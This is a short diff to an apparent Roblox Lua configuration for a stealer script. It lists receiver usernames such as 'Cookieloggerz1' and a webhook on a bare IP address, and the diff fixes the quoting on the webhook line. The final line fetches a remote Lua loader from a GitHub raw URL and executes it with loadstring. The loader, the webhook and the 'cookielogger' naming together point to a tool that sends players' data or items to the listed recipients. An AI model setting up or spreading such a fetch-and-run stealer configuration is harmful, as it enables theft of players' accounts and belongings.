@@ -1,4 +1,4 @@
 Usernames = {"Cookieloggerz1", "KrxmAlt1", "Cookieloggerz2"} -- add/delete as many as u want
-Webhooks = {"http://93.183.83.94:8000/webhook/18ae32f4-6d73-422f-870f-2db23e5df834""} -- add/delete as many as u want
+Webhooks = {"http://93.183.83.94:8000/webhook/18ae32f4-6d73-422f-870f-2db23e5df834"} -- add/delete as many as u want
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/jjrite/AME/refs/heads/main/loader.lua",true))()
